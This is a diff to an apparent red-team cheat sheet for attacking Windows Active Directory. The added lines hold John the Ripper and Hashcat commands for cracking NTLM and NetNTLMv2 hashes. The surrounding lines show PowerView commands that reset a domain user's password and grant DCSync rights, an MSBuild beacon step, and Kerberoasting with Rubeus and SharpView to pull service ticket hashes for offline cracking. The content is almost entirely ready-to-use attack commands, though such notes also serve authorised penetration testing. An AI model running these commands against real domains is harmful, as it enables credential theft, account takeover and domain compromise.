@@ -53,6 +53,11 @@ PowerView
   Change User PW: powerpick $newpwd = ConvertTo-SecureString -String "Password1!" -AsPlainText –Force; Set-DomainUserPassword -Identity <username> -AccountPassword $newpwd
   Change ACL Perms: Add-DomainObjectAcl -TargetIdentity <domain|user|computer> -PrincipalIdentity <user|computer> -Rights <DCSync|All> -Verbose
 
+Password Crack Examples
+  JTR: john --format=netntlmv2 --wordlist=/usr/share/wordlist/rockyou hash_file.txt
+  HASHCAT: Hashcat -a0 -w3 -m1000 /path/to/hashes /path/to/dictionary [-r rules file]
+    * a = dictionary attack; w3 = almost all processing hardware; m = hash type - 1000 is NTLM
+
 Initial Beacon
   MSBuild:
     Download XML from: https://github.com/3gstudent/msbuild-inline-task
@@ -135,7 +140,7 @@ Lateral Movement
 PrivEsc
   Kerberoast (Request SPN and get the TGS for offline cracking)
     Rubeus.exe keberoast asreproast /format:hashcat /outfile:hashes.tx
-      Hashcat -a0 -w3 -m 13100 [-r rules file] /path/to/hashes /path/to/dictionary
+      Hashcat -a0 -w3 -m 13100 /path/to/hashes /path/to/dictionary [-r rules file]
     -OR-
     SharpView.exe Invoke-Kerberoast (optional: -Domain:dom.fqdn -Server:DC.fqdn)
     Rubeus.exe /tgtdeleg /user:sqlservice (<-SamAccountName)
